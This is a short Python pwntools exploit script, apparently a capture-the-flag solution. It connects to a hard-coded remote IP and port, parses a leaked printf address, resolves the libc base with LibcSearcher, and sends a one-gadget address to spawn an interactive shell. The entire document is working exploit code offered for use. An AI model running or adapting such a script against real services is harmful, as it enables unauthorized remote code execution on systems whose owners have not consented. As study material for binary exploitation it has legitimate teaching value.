from LibcSearcher import *
from pwn import *

io = remote("47.100.63.152", 28022)
context(arch="amd64", os="linux", log_level="debug")

# gadgetbase = 0x45206
gadgetbase = 0x45216

io.recvuntil("for u:0x")
printfaddr = int(io.recv(12), 16)
# printfaddr = 0x7fc7b10f8800
print(hex(printfaddr))

libc = LibcSearcher("printf", printfaddr)
libcbase = printfaddr - libc.dump("printf")
io.recvuntil("go:")
print(libcbase+gadgetbase)
io.sendline(str(libcbase + gadgetbase))
io.interactive()